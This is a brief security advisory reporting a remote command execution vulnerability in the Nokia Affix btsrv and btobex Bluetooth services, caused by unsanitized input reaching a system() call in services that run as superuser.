Nokia Affix btsrv/btobex are reported prone to a remote command execution vulnerability. The issue exists due to a lack of input sanitization that is performed before using attacker-controlled data in a 'system()' call.

Because the affected services run with superuser privileges, this issue may be exploited to fully compromise a target computer that is running the affected software.
